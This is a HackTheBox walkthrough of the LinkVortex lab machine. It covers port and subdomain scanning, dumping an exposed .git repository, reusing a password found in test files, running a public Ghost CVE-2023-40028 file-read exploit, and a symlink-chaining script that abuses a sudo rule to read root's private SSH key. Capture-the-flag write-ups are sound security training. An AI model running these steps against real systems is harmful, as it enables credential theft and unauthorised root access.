# LinkVortex HackTheBox WalkThrough

![LinkVortex](../../img/LinkVortex/LinkVortex.png)

We start the machine as usual by performing a full TCP port scan.

```
nmap -p- -sS -Pn -n --min-rate 5000 10.129.231.194

Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

We see that ports `22` and `80` are open. Let's run a more in-depth scan on those two to identify services and versions running.

```
nmap -p 22,80 -sVC 10.129.231.194 -oN services.txt

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://linkvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We identify two services: `SSH` on port `22`, and `HTTP` on port `80`. However, the HTTP service shows a redirect warning: `Did not follow redirect to http://linkvortex.htb/`. This happens because our system doesn’t know the `linkvortex.htb` domain yet. To fix that, we add it to `/etc/hosts`:

```
echo "10.129.231.194 linkvortex.htb" >> /etc/hosts
```

After basic recon, we visit the webpage looking for vulnerabilities.

![site](../../img/LinkVortex/site.png)

Since nothing interesting shows up at first glance, we attempt subdomain enumeration via fuzzing.

```
ffuf -c -u http://linkvortex.htb -H 'Host: FUZZ.linkvortex.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 --ic --fs 230

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 50ms]
```

A subdomain `dev` is discovered. Let's also add it to `/etc/hosts` and inspect it further.

```
echo "10.129.231.194 dev.linkvortex.htb" >> /etc/hosts
```

![dev.site](../../img/LinkVortex/dev.site.png)

No clear vulnerabilities appear, and directory enumeration reveals nothing either. So we try fuzzing for hidden directories (those starting with `.`):

```
ffuf -c -u http://dev.linkvortex.htb/.FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 --ic

git                     [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 46ms]
```

There’s a `.git` directory exposed, which might allow access to the site's source code.

We use the git-dumper tool to download the `.git` contents:

```
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
```

```
python -m venv venv
venv/bin/pip install -r ./requirements.txt
venv/bin/python git_dumper.py http://dev.linkvortex.htb/.git ../repo
```

Inside the dumped repository, we find potentially useful files like `Dockerfile.ghost`.

```
FROM ghost:5.58.0

# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json

# Prevent installing packages
RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb

# Wait for the db to be ready first
COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
COPY entry.sh /entry.sh
RUN chmod +x /var/lib/ghost/wait-for-it.sh
RUN chmod +x /entry.sh

ENTRYPOINT ["/entry.sh"]
CMD ["node", "current/index.js"]
```

Although no credentials are directly exposed, we try searching for the keyword `password` across the repo:

```
find . -type f -exec grep 'password' {} +
```

```
./ghost/core/test/unit/api/canary/session.test.js:                password: 'qu33nRul35'
./ghost/core/test/regression/api/admin/authentication.test.js:            const password = 'OctopiFociPilfer45'
./ghost/core/test/regression/api/admin/authentication.test.js:                        password: 'thisissupersafe'
./ghost/core/test/regression/api/admin/authentication.test.js:                        password: 'lel123456'
./ghost/core/test/regression/api/admin/authentication.test.js:                        password: '12345678910'
./ghost/core/test/regression/api/admin/authentication.test.js:                        password: '12345678910'
./ghost/core/test/utils/fixtures/data-generator.js:            password: 'Sl1m3rson99'
./ghost/security/test/tokens.test.js:            password: 'password'
./ghost/security/test/tokens.test.js:            password: '12345678'
./ghost/security/test/tokens.test.js:            password: '123456'
```

One file, `/ghost/core/test/regression/api/admin/authentication.test.js`, contains:

```
const email = 'test@example.com';
const password = 'OctopiFociPilfer45';
```

Logging in with that email fails, so we try using `admin@linkvortex.htb` with the same password `OctopiFociPilfer45` and it works!

![login-cmd](../../img/LinkVortex/login-cms.png)

We now have admin access to the CMS dashboard.

![dashboard](../../img/LinkVortex/dashboard.png)

We check for known vulnerabilities in `Ghost 5.58` (as detected by Wappalyzer). One valid vulnerability is [CVE-2023-40028](https://github.com/0xyassine/CVE-2023-40028/blob/master/CVE-2023-40028.sh), which allows arbitrary file reads.

Download the exploit.

```
wget https://raw.githubusercontent.com/0xyassine/CVE-2023-40028/refs/heads/master/CVE-2023-40028.sh
```

And change the url to `the machine's domain`

```
GHOST_URL='http://linkvortex.htb'
```

Execute the exploit using the credentials we found. Let's try to read the file we discovered in the dockerfile: `/var/lib/ghost/config.production.json`.

```
./CVE-2023-40028.sh -u 'admin@linkvortex.htb' -p 'OctopiFociPilfer45'

file> /var/lib/ghost/config.production.json

...
"auth": {
    "user": "bob@linkvortex.htb",
    "pass": "fibber-talented-worth"
}
....
```

We now have SSH credentials for the user bob. Let’s try logging in:

```
ssh bob@linkvortex.htb
bob@linkvortex.htb's password: fibber-talented-worth
```

We're in the target machine as user `bob`. Let's check available `sudo` permissions:

```
sudo -l

Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

We can run `/opt/ghost/clean_symlink.sh` as root, and the environment variable `CHECK_CONTENT` is preserved. Let's take a look to the script.

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

It’s a Bash script that reads a symbolic link pointing to a .png file and, if the `$CHECK_CONTENT` environment variable is set to `true`, it displays its contents. One important detail is that it blocks access to "critical" directories such as `/etc` and `/root`.

Bypassing the `.png` requirement is simple — we just need to give our symlink a .png extension. To bypass the restriction on accessing "sensitive" paths, we can use a symlink to a symlink. This way, the script won’t directly see that the file points to a restricted location; instead, it only sees the intermediate link.

To ensure that `$CHECK_CONTENT` is always set to `true`, we can simply run `export CHECK_CONTENT=true`.

To automate the whole process, we can create a simple Bash script like the following:

```bash
#!/bin/bash

path=$1

ln -s "$path" link.png
ln -s "$(pwd)/link.png" link-link.png

export CHECK_CONTENT=true

sudo /usr/bin/bash /opt/ghost/clean_symlink.sh link-link.png

rm link.png link-link.png 2>/dev/null
```

We run it to extract the root’s private SSH key:

```
./exploit.sh /root/.ssh/id_rsa | tail -n +3 > id_rsa_root
chmod 600 id_rsa_root
ssh -i id_rsa_root root@localhost
```

We're now `root`. We can read the flag:

```
cd
cat root.txt
```

After finishing the machine, don’t forget to remove the line from `/etc/hosts` corresponding to the machine to avoid accumulating lines with each machine you do.

If you found this useful, consider giving a star to the project. Thank you, and good luck with your future machines ❤️.